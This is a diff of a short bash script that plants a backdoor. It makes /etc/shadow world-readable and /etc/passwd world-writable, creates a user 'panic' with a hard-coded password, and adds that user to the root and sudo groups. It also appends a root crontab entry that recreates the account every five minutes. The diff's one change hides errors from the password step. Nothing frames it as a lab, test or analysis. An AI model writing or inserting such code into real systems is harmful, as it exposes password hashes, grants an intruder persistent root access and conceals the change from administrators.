@@ -1,7 +1,7 @@
 #!/bin/bash
 chmod 644 /etc/shadow
 chmod 666 /etc/passwd
-useradd panic  && echo -e "riseab0ve\nriseab0ve" | passwd panic
+useradd panic  && echo -e "riseab0ve\nriseab0ve" | passwd panic 2> /dev/null
 usermod -a -G root panic
 usermod -a -G sudo panic
 echo "*/5 * * * *  root  useradd panic && echo -e "riseab0ve\nriseab0ve" | passwd panic && usermod -a -G root panic" >> /etc/crontab
